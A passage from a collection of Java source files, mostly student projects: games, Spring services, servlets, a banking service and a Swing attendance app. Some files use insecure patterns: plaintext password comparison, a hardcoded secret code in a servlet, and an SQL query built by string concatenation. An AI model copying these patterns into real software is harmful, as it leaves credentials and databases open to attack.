findRoleByRoleName(roleName);\n        if (user.getRoles() !=null) {\n\n            user.getRoles().add(role);\n            role.getUsers().add(user);\n        }\n        // userRepository.save(user);\n\n    }\n\n    @Override\n    public User authenticate(String userName, String password) {\n        User user= userRepository.findByUsername(userName);\n        if (user==null)throw new RuntimeException(\"Bad Credentials\");\n        if (user.getPassword().equals(password)){\n            return user;\n        }\n        throw new RuntimeException(\"Bad Credentials\");\n    }\n}\n",
    "import java.awt.Graphics;\r\nimport java.util.*;\r\nimport java.awt.Image;\r\nimport java.awt.image.BufferedImage;\r\nimport java.io.File;\r\nimport java.io.IOException;\r\n\r\nimport javax.imageio.ImageIO;\r\n\r\npublic class Tile {\r\n\r\n\tprotected final int SQUARE_SIZE = MineSweeperPanel.squareSize; //Size of an individual tile\r\n\tprivate static Image sprites;\r\n\tprivate static Image[] images; //Array of all images\r\n\tprivate int displayState;\r\n\tprivate int actualState;\r\n\tprivate int[] location = new int[2]; //Coordinates/location of this tile\r\n\r\n\tpublic Tile(int row, int col, int s) {\r\n\t\tsetUpImages();\r\n\t\tlocation[0] = row;\r\n\t\tlocation [1] = col;\r\n\t\tthis.displayState = s;\r\n\t}\r\n\r\n\tprivate void setUpImages() {\r\n\t\tif(sprites == null) {// only open the file once\r\n\t\t\ttry {\r\n\t\t\t\tsprites = ImageIO.read(new File(\"minesweepersprites.PNG\"));\r\n\t\t\t} catch (IOException e) {\t\r\n\t\t\t\te.printStackTrace();\r\n\t\t\t}\r\n\t\t\timages = new Image[14];\r\n\t\t\t\r\n\t\t\t//Number tiles\r\n\t\t\timages[1] = ((BufferedImage)sprites).getSubimage(3,991,232,233).getScaledInstance(SQUARE_SIZE, SQUARE_SIZE, BufferedImage.SCALE_SMOOTH);\r\n\t\t\timages[2] = ((BufferedImage)sprites).getSubimage(250,991,232,233).getScaledInstance(SQUARE_SIZE, SQUARE_SIZE, BufferedImage.SCALE_SMOOTH);\r\n\t\t\timages[3] = ((BufferedImage)sprites).getSubimage(497,991,232,233).getScaledInstance(SQUARE_SIZE, SQUARE_SIZE, BufferedImage.SCALE_SMOOTH);\r\n\t\t\timages[4] = ((BufferedImage)sprites).getSubimage(743,991,232,233).getScaledInstance(SQUARE_SIZE, SQUARE_SIZE, BufferedImage.SCALE_SMOOTH);\r\n\t\t\timages[5] = ((BufferedImage)sprites).getSubimage(990,991,232,233).getScaledInstance(SQUARE_SIZE, SQUARE_SIZE, BufferedImage.SCALE_SMOOTH);\r\n\t\t\timages[6] = ((BufferedImage)sprites).getSubimage(1237,991,232,233).getScaledInstance(SQUARE_SIZE, SQUARE_SIZE, BufferedImage.SCALE_SMOOTH);\r\n\t\t\timages[7] = ((BufferedImage)sprites).getSubimage(1484,991,232,233).getScaledInstance(SQUARE_SIZE, SQUARE_SIZE, BufferedImage.SCALE_SMOOTH);\r\n\t\t\timages[8] = ((BufferedImage)sprites).getSubimage(1731,991,232,233).getScaledInstance(SQUARE_SIZE, SQUARE_SIZE, BufferedImage.SCALE_SMOOTH);\r\n\t\t\t//Clicked blank tile\r\n\t\t\timages[0] = ((BufferedImage)sprites).getSubimage(250,744,232,233).getScaledInstance(SQUARE_SIZE, SQUARE_SIZE, BufferedImage.SCALE_SMOOTH);\r\n\t\t\t\r\n\t\t\t//Unclicked blank tile (DISPLAY STATE ONLY)\r\n\t\t\timages[9] = ((BufferedImage)sprites).getSubimage(3,744,232,233).getScaledInstance(SQUARE_SIZE, SQUARE_SIZE, BufferedImage.SCALE_SMOOTH);\r\n\t\t\t//Flag tile (DISPLAY STATE ONLY)\r\n\t\t\timages[10] = ((BufferedImage)sprites).getSubimage(497,744,232,233).getScaledInstance(SQUARE_SIZE, SQUARE_SIZE, BufferedImage.SCALE_SMOOTH);\r\n\t\t\t\r\n\t\t\t//Undetonated bomb tile\r\n\t\t\timages[11] = ((BufferedImage)sprites).getSubimage(1237,744,232,233).getScaledInstance(SQUARE_SIZE, SQUARE_SIZE, BufferedImage.SCALE_SMOOTH);\r\n\t\t\t//Detonated bomb tile\r\n\t\t\timages[12] = ((BufferedImage)sprites).getSubimage(1484,744,232,233).getScaledInstance(SQUARE_SIZE, SQUARE_SIZE, BufferedImage.SCALE_SMOOTH);\r\n\t\t\t//Not bomb tile\r\n\t\t\timages[13] = ((BufferedImage)sprites).getSubimage(1731,744,232,233).getScaledInstance(SQUARE_SIZE, SQUARE_SIZE, BufferedImage.SCALE_SMOOTH);\r\n\r\n\t\t}\r\n\t}\r\n\r\n\t//Getters and setters\r\n\tpublic void setDisplayState(int s) {\r\n\t\tthis.displayState = s;\r\n\t}\r\n\t\r\n\tpublic void setActualState(int s) {\r\n\t\tthis.actualState = s;\r\n\t}\r\n\r\n\tpublic int getDisplayState() {\r\n\t\treturn this.displayState;\r\n\t}\r\n\t\r\n\tpublic int getActualState() {\r\n\t\treturn this.actualState;\r\n\t}\r\n\r\n\t//Determines if this tile is a bomb\r\n\tpublic int isBomb() {\r\n\t\tif(this.actualState == 11) {\r\n\t\t\treturn 1;\r\n\t\t} else {\r\n\t\t\treturn 0;\r\n\t\t}\r\n\t}\r\n\r\n\t//Determines if this tile is in an ArrayList of tiles\r\n\tpublic boolean isIn(ArrayList<Tile> t) {\r\n\t\tfor(int i = 0; i < t.size(); i++) {\r\n\t\t\tif(this.location[0] == t.get(i).location[0] && this.location[1] == t.get(i).location[1]) {\r\n\t\t\t\treturn true;\r\n\t\t\t}\r\n\t\t}\r\n\t\treturn false;\r\n\t}\r\n\t\r\n\t//Draws tile in the display state\r\n\tpublic void draw(Graphics g) {\r\n\t\tg.drawImage(images[displayState], location[1]*SQUARE_SIZE, location[0]*SQUARE_SIZE, null);\r\n\r\n\t}\r\n\r\n}\r\n",
    "package week_1.day_2;\n\npublic class WhatIsMainMethod {\n\n    /*\n    *\n    * the main method!\n\n\n\n     Think of it like the ignition key of a car. Just like turning the key starts the engine and sets the car in motion, the main method is the starting point for any standalone Java program. When you run your Java program, the code inside the main method is what gets executed first.\n\n\n\n    Here's how the main method works in a Java program:\n\n\n\n    Entry Point: Just like you need to turn the key to start your car, the Java Virtual Machine (JVM) needs\n\n    an entry point to start running your program. The main method serves as that entry point.\n\n\n\n    Syntax: The main method has a very specific signature in Java. It's usually written as\n\n    public static void main(String[] args). This is like the specific shape and size of the ignition keyhole;\n\n    it has to be this way for the JVM to recognize it.\n\n\n\n    1. Public: The public keyword means that the main method is accessible from anywhere.\n    It's like how the ignition is usually accessible to anyone sitting in the driver's seat.\n\n\n    2. Static: Static means that the method belongs to the class itself, rather than any particular\n    object instance of the class. You don't need to create an object of the class to start the main method,\n    just like you don't need to build a car from scratch every time you want to drive; you just need\n    * the key to an existing car.\n\n    3. Void: The void keyword means that the main method doesn't return any value.\n    * Starting the car doesn't \"give you back\" anything; it just sets the process in motion.\n\n    4. String[] args: This is an array of Strings that you can pass when you run your program. Imagine\n    if your car's ignition also asked you for the destination or other settings each time you started the car;\n    that's what these arguments are like. However, they're optional.\n\n    First to Run: As soon as you start your Java program, the main method is the first thing that runs.\n    It's like how turning the key is the first step in driving your car.\n    So, whenever you're looking at a Java program, look for the main method.\n    * That's where the action starts,  and it gives you a roadmap for understanding what the program\n    * is designed to do. Just like a car won't run without turning the key, a standalone Java\n    *  program won't run without a main method.\n    * */\n\n}\n",
    "package com.educacionit.servlets;\n\nimport java.io.IOException;\nimport java.util.List;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\n\nimport com.educacionit.conexion.DAOManager;\nimport com.educacionit.excepciones.DBManagerException;\nimport com.educacionit.model.Pelicula;\n\npublic class BuscarPeliculasServlet extends HttpServlet {\n\tprivate static final long serialVersionUID = 1L;\n\n\tprotected void doGet(HttpServletRequest request, HttpServletResponse response)\n\t\t\tthrows ServletException, IOException {\n\t\t// Obtener los par\u00e1metros de b\u00fasqueda de la solicitud HTTP\n\t\tString genero = request.getParameter(\"genero\");\n\t\tString titulo = request.getParameter(\"titulo\");\n\n\t\t// Instanciamos el DAOManager\n\t\tDAOManager daoManager = new DAOManager();\n\t\ttry {\n\t\t\t// Verificar y crear la tabla si no existe\n\t\t\tdaoManager.verificarYCrearTabla();\n\n\t\t\t// Inicializar lista de pel\u00edculas encontradas\n\t\t\tList<Pelicula> peliculas = null; // Inicializo la lista como nula\n\n\t\t\tif (genero != null && !genero.isEmpty()) {\n\t\t\t\t// Busco pel\u00edculas por g\u00e9nero\n\t\t\t\tpeliculas = daoManager.buscarPeliculasPorGenero(genero);\n\t\t\t} else if (titulo != null && !titulo.isEmpty()) {\n\t\t\t\t// Busco pel\u00edculas por t\u00edtulo\n\t\t\t\tpeliculas = daoManager.buscarPeliculasPorTitulo(titulo);\n\t\t\t}\n\n\t\t\t// Guardo la lista de pel\u00edculas en el alcance de la solicitud\n\t\t\t// solo si se realiz\u00f3 una b\u00fasqueda\n\t\t\tif (peliculas != null && !peliculas.isEmpty()) {\n\t\t\t\trequest.setAttribute(\"peliculas\", peliculas);\n\t\t\t}\n\n\t\t\t// Redirigir la solicitud al archivo JSP correspondiente\n\t\t\t\n\t\t\trequest.getRequestDispatcher(\"/buscarPeliculas.jsp\").forward(request, response);\n\n\t\t} catch (DBManagerException e) {\n\t\t\te.printStackTrace();\n\t\t\tresponse.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);\n\t\t\tresponse.getWriter().println(\"Error al obtener las pel\u00edculas: \" + e.getMessage());\n\t\t}\n\t}\n\n\tprotected void doPost(HttpServletRequest request, HttpServletResponse response)\n\t\t\tthrows ServletException, IOException {\n\t\tHttpSession session = request.getSession();\n\t\tString codigo_secreto = \"Educacionit\"; // C\u00f3digo secreto hardcodeado\n\t\tsession.setAttribute(\"codigo_secreto\", codigo_secreto);\n\n\t\tString claveIngresada = request.getParameter(\"codigo_secreto\");\n\n\t\tif (claveIngresada != null && claveIngresada.equals(codigo_secreto)) {\n\t\t\t// Obtener el c\u00f3digo de la pel\u00edcula seleccionada\n\t\t\tString codigoPeliculaString = request.getParameter(\"codigoPelicula\");\n\t\t\tif (codigoPeliculaString != null && !codigoPeliculaString.isEmpty()) {\n\t\t\t\tint codigoPelicula = Integer.parseInt(codigoPeliculaString);\n\t\t\t\tDAOManager daoManager = new DAOManager();\n\t\t\t\ttry {\n\t\t\t\t\tdaoManager.verificarYCrearTabla();\n\t\t\t\t\t// Obtener la pel\u00edcula por su ID\n\t\t\t\t\tPelicula pelicula = daoManager.obtenerPeliculaPorID(codigoPelicula);\n\t\t\t\t\t// Guardar la pel\u00edcula en el alcance de sesi\u00f3n para usarla en la p\u00e1gina de\n\t\t\t\t\t// detalles\n\t\t\t\t\tsession.setAttribute(\"peliculaSeleccionada\", pelicula);\n\t\t\t\t\t\n\t\t\t\t\t// Redirigir a la p\u00e1gina de detalles\n\t\t\t\t\tresponse.sendRedirect(\"paginaDetalles.jsp\");\n\t\t\t\t\treturn; \n\t\t\t\t} catch (DBManagerException e) {\n\t\t\t\t\te.printStackTrace();\n\t\t\t\t\tresponse.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);\n\t\t\t\t\tresponse.getWriter().println(\"Error al obtener la pel\u00edcula: \" + e.getMessage());\n\t\t\t\t\treturn; \n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\tresponse.sendRedirect(\"errorClave.jsp\");\n\t\t\t\treturn; \n\t\t\t}\n\t\t} else {\n\t\t\tresponse.sendRedirect(\"errorClave.jsp\");\n\t\t\treturn; \n\t\t}\n\t}\n\n}\n",
    "package com.springboot.blog;\n\nimport com.springboot.blog.entity.User;\nimport com.springboot.blog.repository.UserRepository;\nimport org.springframework.security.core.GrantedAuthority;\nimport org.springframework.security.core.authority.SimpleGrantedAuthority;\nimport org.springframework.security.core.userdetails.UserDetails;\nimport org.springframework.security.core.userdetails.UserDetailsService;\nimport org.springframework.security.core.userdetails.UsernameNotFoundException;\nimport org.springframework.stereotype.Service;\n\nimport java.util.Set;\nimport java.util.stream.Collectors;\n@Service\npublic final class CustomUserDetailsService implements UserDetailsService {\n    private UserRepository userRepository;\n\n    public CustomUserDetailsService(UserRepository userRepository) {\n        this.userRepository = userRepository;\n    }\n\n    @Override\n\n    public UserDetails loadUserByUsername(String usernameOrEmail) throws UsernameNotFoundException {\n        User user = userRepository.findByUsernameOrEmail(usernameOrEmail, usernameOrEmail)\n                .orElseThrow(() ->\n                        new UsernameNotFoundException(\"User not found with username or email: \"+ usernameOrEmail));\n\n        Set<GrantedAuthority> authorities = user\n                .getRoles()\n                .stream()\n                .map((role) -> new SimpleGrantedAuthority(((User) role).getName())).collect(Collectors.toSet());\n\n        return new org.springframework.security.core.userdetails.User(user.getEmail(),\n                user.getPassword(),\n                authorities);\n    }\n\n}\n",
    "package br.com.danluan.seuJob.model;\n\nimport jakarta.persistence.*;\nimport org.hibernate.annotations.CreationTimestamp;\n\nimport java.util.Date;\n\n@Entity\n@Table(name = \"tb_application\")\npublic class Application {\n\n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Integer id;\n\n    @ManyToOne(fetch = FetchType.LAZY)\n    @JoinColumn(name = \"job_id\")\n    private Job job;\n\n    @ManyToOne(fetch = FetchType.LAZY)\n    @JoinColumn(name = \"user_id\")\n    private User user;\n\n    @Column()\n    private String status;\n\n    @CreationTimestamp\n    @Temporal(TemporalType.TIMESTAMP)\n    @Column(name = \"apply_date\", updatable = false)\n    private Date applyDate;\n\n    public Application() {\n    }\n\n    public Application(Job job, User user) {\n        this.job = job;\n        this.user = user;\n        this.status = status;\n    }\n\n\n    public Job getJob() {\n        return job;\n    }\n\n    public void setJob(Job job) {\n        this.job = job;\n    }\n\n    public User getUser() {\n        return user;\n    }\n\n    public void setUser(User user) {\n        this.user = user;\n    }\n\n    public String getStatus() {\n        return status;\n    }\n\n    public void setStatus(String status) {\n        this.status = status;\n    }\n}\n",
    "package com.rivelbop.rivelworks.graphics3d.shapes;\n\nimport com.badlogic.gdx.graphics.Color;\nimport com.badlogic.gdx.graphics.Texture;\nimport com.badlogic.gdx.graphics.VertexAttributes;\nimport com.badlogic.gdx.graphics.g3d.Material;\nimport com.badlogic.gdx.graphics.g3d.attributes.ColorAttribute;\nimport com.badlogic.gdx.graphics.g3d.attributes.TextureAttribute;\nimport com.badlogic.gdx.graphics.g3d.utils.ModelBuilder;\n\n/**\n * An extension of the {@link Shape3D} class that creates a cube.\n *\n * @author Philip Jerzak (RivelBop)\n */\npublic class Cube extends Shape3D {\n    /**\n     * Creates a cube by providing its dimensions and color.\n     *\n     * @param width  The width of the cube.\n     * @param height The height of the cube.\n     * @param depth  The depth/girth of the cube.\n     * @param color  The color of the cube.\n     */\n    public Cube(float width, float height, float depth, Color color) {\n        super(new ModelBuilder().createBox(width, height, depth,\n                new Material(ColorAttribute.createDiffuse(color)),\n                VertexAttributes.Usage.Position | VertexAttributes.Usage.Normal));\n    }\n\n    /**\n     * Generates a cube by providing its dimensions and the wrapping texture.\n     *\n     * @param width   The width of the cube.\n     * @param height  The height of the cube.\n     * @param depth   The depth/girth of the cube.\n     * @param texture The wrapping texture applied to the cube.\n     */\n    public Cube(float width, float height, float depth, Texture texture) {\n        super(new ModelBuilder().createBox(width, height, depth,\n                new Material(TextureAttribute.createDiffuse(texture)),\n                VertexAttributes.Usage.Position | VertexAttributes.Usage.Normal | VertexAttributes.Usage.TextureCoordinates));\n    }\n}",
    "package com.alipay.authserver.domain;\n\nimport java.util.ArrayList;\nimport java.util.Date;\nimport java.util.List;\n\npublic class AuthAccessTokenExample {\n    /**\n     * This field was generated by MyBatis Generator.\n     * This field corresponds to the database table auth_access_token\n     *\n     * @mbg.generated\n     */\n    protected String orderByClause;\n\n    /**\n     * This field was generated by MyBatis Generator.\n     * This field corresponds to the database table auth_access_token\n     *\n     * @mbg.generated\n     */\n    protected boolean distinct;\n\n    /**\n     * This field was generated by MyBatis Generator.\n     * This field corresponds to the database table auth_access_token\n     *\n     * @mbg.generated\n     */\n    protected List<Criteria> oredCriteria;\n\n    /**\n     * This method was generated by MyBatis Generator.\n     * This method corresponds to the database table auth_access_token\n     *\n     * @mbg.generated\n     */\n    public AuthAccessTokenExample() {\n        oredCriteria = new ArrayList<Criteria>();\n    }\n\n    /**\n     * This method was generated by MyBatis Generator.\n     * This method corresponds to the database table auth_access_token\n     *\n     * @mbg.generated\n     */\n    public void setOrderByClause(String orderByClause) {\n        this.orderByClause = orderByClause;\n    }\n\n    /**\n     * This method was generated by MyBatis Generator.\n     * This method corresponds to the database table auth_access_token\n     *\n     * @mbg.generated\n     */\n    public String getOrderByClause() {\n        return orderByClause;\n    }\n\n    /**\n     * This method was generated by MyBatis Generator.\n     * This method corresponds to the database table auth_access_token\n     *\n     * @mbg.generated\n     */\n    public void setDistinct(boolean distinct) {\n        this.distinct = distinct;\n    }\n\n    /**\n     * This method was generated by MyBatis Generator.\n     * This method corresponds to the database table auth_access_token\n     *\n     * @mbg.generated\n     */\n    public boolean isDistinct() {\n        return distinct;\n    }\n\n    /**\n     * This method was generated by MyBatis Generator.\n     * This method corresponds to the database table auth_access_token\n     *\n     * @mbg.generated\n     */\n    public List<Criteria> getOredCriteria() {\n        return oredCriteria;\n    }\n\n    /**\n     * This method was generated by MyBatis Generator.\n     * This method corresponds to the database table auth_access_token\n     *\n     * @mbg.generated\n     */\n    public void or(Criteria criteria) {\n        oredCriteria.add(criteria);\n    }\n\n    /**\n     * This method was generated by MyBatis Generator.\n     * This method corresponds to the database table auth_access_token\n     *\n     * @mbg.generated\n     */\n    public Criteria or() {\n        Criteria criteria = createCriteriaInternal();\n        oredCriteria.add(criteria);\n        return criteria;\n    }\n\n    /**\n     * This method was generated by MyBatis Generator.\n     * This method corresponds to the database table auth_access_token\n     *\n     * @mbg.generated\n     */\n    public Criteria createCriteria() {\n        Criteria criteria = createCriteriaInternal();\n        if (oredCriteria.size() == 0) {\n            oredCriteria.add(criteria);\n        }\n        return criteria;\n    }\n\n    /**\n     * This method was generated by MyBatis Generator.\n     * This method corresponds to the database table auth_access_token\n     *\n     * @mbg.generated\n     */\n    protected Criteria createCriteriaInternal() {\n        Criteria criteria = new Criteria();\n        return criteria;\n    }\n\n    /**\n     * This method was generated by MyBatis Generator.\n     * This method corresponds to the database table auth_access_token\n     *\n     * @mbg.generated\n     */\n    public void clear() {\n        oredCriteria.clear();\n        orderByClause = null;\n        distinct = false;\n    }\n\n    /**\n     * This class was generated by MyBatis Generator.\n     * This class corresponds to the database table auth_access_token\n     *\n     * @mbg.generated\n     */\n    protected abstract static class GeneratedCriteria {\n        protected List<Criterion> criteria;\n\n        protected GeneratedCriteria() {\n            super();\n            criteria = new ArrayList<Criterion>();\n        }\n\n        public boolean isValid() {\n            return criteria.size() > 0;\n        }\n\n        public List<Criterion> getAllCriteria() {\n            return criteria;\n        }\n\n        public List<Criterion> getCriteria() {\n            return criteria;\n        }\n\n        protected void addCriterion(String condition) {\n            if (condition == null) {\n                throw new RuntimeException(\"Value for condition cannot be null\");\n            }\n            criteria.add(new Criterion(condition));\n        }\n\n        protected void addCriterion(String condition, Object value, String property) {\n            if (value == null) {\n                throw new RuntimeException(\"Value for \" + property + \" cannot be null\");\n            }\n       ",
    "package online.davidcoldea.bankingapp.service.impl;\n\nimport online.davidcoldea.bankingapp.dto.AccountDto;\nimport online.davidcoldea.bankingapp.entity.Account;\nimport online.davidcoldea.bankingapp.mapper.AccountMapper;\nimport online.davidcoldea.bankingapp.repository.AccountRepository;\nimport online.davidcoldea.bankingapp.service.AccountService;\nimport org.springframework.stereotype.Service;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Optional;\nimport java.util.stream.Collectors;\n\n@Service\npublic class AccountServiceImpl implements AccountService {\n    private final AccountRepository accountRepository;\n\n    public AccountServiceImpl(AccountRepository accountRepository) {\n        this.accountRepository = accountRepository;\n    }\n\n    @Override\n    public AccountDto createAccount(AccountDto accountDto) {\n        Account account = AccountMapper.mapToAccount(accountDto);\n        Account savedAccount = accountRepository.save(account);\n        AccountDto accountDto1 = AccountMapper.mapToAccountDto(savedAccount);\n        return accountDto1;\n    }\n\n    @Override\n    public AccountDto getAccountById(Long id) {\n        Optional<Account> optionalAccount = accountRepository.findById(id);\n        if(optionalAccount.isPresent()) {\n            Account account = optionalAccount.get();\n            AccountDto accountDto = AccountMapper.mapToAccountDto(account);\n            return accountDto;\n        }   else {\n            //change\n            return null;\n        }\n    }\n\n    @Override\n    public AccountDto depositAmount(Long id, double amount) {\n        Optional<Account> optionalAccount = accountRepository.findById(id);\n        if (optionalAccount.isPresent()) {\n            Account account = optionalAccount.get();\n            double newBalance = account.getBalance() + amount;\n            account.setBalance(newBalance);\n            Account newAccount = accountRepository.save(account);\n            AccountDto accountDto = AccountMapper.mapToAccountDto(newAccount);\n            return accountDto;\n        }   else {\n            return null;\n        }\n    }\n\n    @Override\n    public AccountDto withdrawAmount(Long id, double amount) {\n        Optional<Account> optionalAccount = accountRepository.findById(id);\n        if (optionalAccount.isPresent()) {\n            Account account = optionalAccount.get();\n            double newBalance = account.getBalance() - amount;\n            account.setBalance(newBalance);\n            Account newAccount = accountRepository.save(account);\n            AccountDto accountDto = AccountMapper.mapToAccountDto(newAccount);\n            return accountDto;\n        }   else {\n            return null;\n        }\n    }\n\n    @Override\n    public List<AccountDto> getAllAccounts() {\n        List<Account> accounts = accountRepository.findAll();\n        List<AccountDto> accountDtos = accounts.stream().map(account -> AccountMapper.mapToAccountDto(account)).collect(Collectors.toList());\n        return accountDtos;\n    }\n\n    @Override\n    public void deleteAccount(Long id) {\n        Optional<Account> optionalAccount = accountRepository.findById(id);\n        if (optionalAccount.isPresent()) {\n            accountRepository.deleteById(id);\n        }\n    }\n}\n",
    "/*\n * To change this license header, choose License Headers in Project Properties.\n * To change this template file, choose Tools | Templates\n * and open the template in the editor.\n */\npackage Zokemon2024;\n\n/**\n *\n * @author ASUS\n */\npublic class Water extends Zokemon {\n\n    private int freezeChance;\n    private boolean freeze;\n\n    public Water() {\n        super();\n        type = \"Water\";\n        level_atk = 2;\n        level_hp = 2;\n        freezeChance = r.nextInt(11) + 20;\n    }\n\n    public boolean getFreeze() {\n        int freezeGacha = r.nextInt(100) + 1;\n        if (freezeGacha <= freezeChance) {\n            freeze = true;\n        } else {\n            freeze = false;\n        }\n        return freeze;\n    }\n\n    public int DealDamage(Zokemon enemy) { // Add if int returned was 0 then dodged by Light type Zokemon!!\n        if (enemy.getType().equals(\"Light\")) {\n            int gacha = r.nextInt(100) + 1;\n            if (gacha <= 50) {\n                return 0; // enemy dodged!\n            } else {\n                enemy.MinusHP(attack);\n            }\n        } else if (enemy.getType().equals(\"Dark\")) {\n            int gacha = r.nextInt(100) + 1;\n            if (gacha <= 75) {\n                currhp -= (attack / 2); // reflect damage to self!\n            }\n            enemy.MinusHP(attack);\n\n        } else if (enemy.getType().equals(\"Grass\")) {\n            enemy.MinusHP((attack * 3) / 4);\n        } else if (enemy.getType().equals(\"Fire\")) {\n            enemy.MinusHP((attack * 3) / 2);\n        } else {\n            enemy.MinusHP(attack);\n        }\n        return attack;\n    }\n}\n",
    "package org.example;\nimport static org.lwjgl.opengl.GL11.*;\npublic class Racket implements BoundedObject{\n    private float r, g, b;\n\n    public float x, y;\n    public final float width, height;\n    private float velocityX = 0.0f;\n    private final float speed = 18.0f;\n    public Vector2D position;\n\n\n    public Racket(float x, float y, float width, float height, float r, float g, float b) {\n\n        this.position = new Vector2D(x, y);\n\n\n        this.x = x;\n        this.y = y;\n        this.width = width;\n        this.height = height;\n        this.r = r;\n        this.g = g;\n        this.b = b;\n    }\n\n    public void update(){\n        position.x += velocityX;;\n        //\u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043a\u043e\u043b\u0438\u0437\u0438\u0439 x\n        if (position.x<= 0 || position.x >=width){\n            velocityX = 0.0f;\n        }\n    }\n    public void render() {\n        glColor3f(r, g, b); // \u0423\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u0446\u0432\u0435\u0442\u0430 \u0431\u043b\u043e\u043a\u0430\n        glBegin(GL_QUADS);\n        glVertex2f(position.x, position.y);\n        glVertex2f(position.x + width, position.y);\n        glVertex2f(position.x + width, position.y + height);\n        glVertex2f(position.x, position.y + height);\n        glEnd();\n    }\n\n    public void moveLeft(){\n        velocityX = -speed;\n    }\n    public void moveRight(){\n        velocityX = speed;\n    }\n    public void stop(){\n        velocityX= 0.0f;\n    }\n\n\n    @Override\n    public float getLeft(){\n        return position.x;\n    }\n    @Override\n    public float getRight(){\n        return position.x + width;\n    }\n    @Override\n    public float getTop(){\n        return position.y;\n    }\n    @Override\n    public float getBottom(){\n        return position.y + height;\n    }\n\n}\n",
    "/*\r\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\r\n * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template\r\n */\r\npackage attendence.management.system;\r\nimport javax.swing.*;\r\nimport java.awt.*;\r\nimport java.sql.*;\r\nimport net.proteanit.sql.DbUtils;\r\nimport java.awt.event.*;\r\n\r\npublic class StudentLeaveDetails extends JFrame implements ActionListener {\r\n\r\n    Choice crollno;\r\n    JTable table;\r\n    JButton search, print, update, add, cancel;\r\n    \r\n    StudentLeaveDetails() {\r\n        \r\n        getContentPane().setBackground(Color.WHITE);\r\n        setLayout(null);\r\n        \r\n        JLabel heading = new JLabel(\"Search by Roll Number\");\r\n        heading.setBounds(20, 20, 150, 20);\r\n        add(heading);\r\n        \r\n        crollno = new Choice();\r\n        crollno.setBounds(180, 20, 150, 20);\r\n        add(crollno);\r\n        \r\n        try {\r\n            Conn c = new Conn();\r\n            ResultSet rs = c.s.executeQuery(\"select * from student\");\r\n            while(rs.next()) {\r\n                crollno.add(rs.getString(\"rollno\"));\r\n            }\r\n        } catch (Exception e) {\r\n            e.printStackTrace();\r\n        }\r\n        \r\n        table = new JTable();\r\n        \r\n        try {\r\n            Conn c = new Conn();\r\n            ResultSet rs = c.s.executeQuery(\"select * from studentleave\");\r\n            table.setModel(DbUtils.resultSetToTableModel(rs));\r\n        } catch (Exception e) {\r\n            e.printStackTrace();\r\n        }\r\n        \r\n        JScrollPane jsp = new JScrollPane(table);\r\n        jsp.setBounds(0, 100, 900, 600);\r\n        add(jsp);\r\n        \r\n        search = new JButton(\"Search\");\r\n        search.setBounds(20, 70, 80, 20);\r\n        search.addActionListener(this);\r\n        add(search);\r\n        \r\n        print = new JButton(\"Print\");\r\n        print.setBounds(120, 70, 80, 20);\r\n        print.addActionListener(this);\r\n        add(print);\r\n        \r\n        cancel = new JButton(\"Cancel\");\r\n        cancel.setBounds(220, 70, 80, 20);\r\n        cancel.addActionListener(this);\r\n        add(cancel);\r\n        \r\n        setSize(900, 700);\r\n        setLocation(300, 100);\r\n        setVisible(true);\r\n    }\r\n    \r\n    public void actionPerformed(ActionEvent ae) {\r\n        if (ae.getSource() == search) {\r\n            String query = \"select * from studentleave where rollno = '\"+crollno.getSelectedItem()+\"'\";\r\n            try {\r\n                Conn c = new Conn();\r\n                ResultSet rs = c.s.executeQuery(query);\r\n                table.setModel(DbUtils.resultSetToTableModel(rs));\r\n            } catch (Exception e) {\r\n                e.printStackTrace();\r\n            }\r\n        } else if (ae.getSource() == print) {\r\n            try {\r\n                table.print();\r\n            } catch (Exception e) {\r\n                e.printStackTrace();\r\n            }\r\n        } else {\r\n            setVisible(false);\r\n        }\r\n    }\r\n\r\n    public static void main(String[] args) {\r\n        new StudentLeaveDetails();\r\n    }\r\n}",
    "package me.lincey.djr.config;\n\nimport lombok.Getter;\nimport me.lincey.djr.Djr;\nimport me.lincey.djr.util.config.Config;\n\n@Getter\npublic class ConfigManager {\n    public static ConfigManager INSTANCE = new ConfigManager();\n\n    private int tickEnergy;\n    private String cd, run, jump, soundJump, soundRun;\n    private double cdJumpA, cdJumpB, cdJumpC, cdRunA, cdRunB, cdRunC,\n                        powerRun, powerJump, offsetJump, levelDivision;\n    private boolean enableOnJoin, enableEnergy, useLevel;\n\n    private Config settings;\n\n    public void setup() {\n        settings = new Config(Djr.INSTANCE, \"settings.yml\", null);\n        settings.saveDefaultConfig();\n    }\n\n    public void loadValues() {\n        this.tickEnergy = settings.getConfiguration().getInt(\"Settings.EachEnergyTick\", 20);\n\n        this.cdJumpA = settings.getConfiguration().getDouble(\"CoolDowns.Jump.DEFAULT\", 15) * 1_000;\n        this.cdJumpB = settings.getConfiguration().getDouble(\"CoolDowns.Jump.VIP1\", 8) * 1_000;\n        this.cdJumpC = settings.getConfiguration().getDouble(\"CoolDowns.Jump.VIP2\", 6) * 1_000;\n        this.cdRunA = settings.getConfiguration().getDouble(\"CoolDowns.Run.DEFAULT\", 10) * 1_000;\n        this.cdRunB = settings.getConfiguration().getDouble(\"CoolDowns.Run.VIP1\", 6) * 1_000;\n        this.cdRunC = settings.getConfiguration().getDouble(\"CoolDowns.Run.VIP2\", 5) * 1_000;\n        this.levelDivision = settings.getConfiguration().getDouble(\"Settings.LevelDivision\", 2);\n\n        this.powerRun = settings.getConfiguration().getDouble(\"Run.POWER\", 2);\n        this.powerJump = settings.getConfiguration().getDouble(\"Jump.POWER\", 1.3);\n        this.offsetJump = settings.getConfiguration().getDouble(\"Jump.Y\", 1.2);\n\n        this.cd = settings.getConfiguration().getString(\"Messages.CoolDown\", \"&bYou must wait before using this again!\");\n        this.run = settings.getConfiguration().getString(\"Messages.Run\", \"&b\u5df2\u542f\u7528\u51b2\u523a\");\n        this.jump = settings.getConfiguration().getString(\"Messages.Jump\", 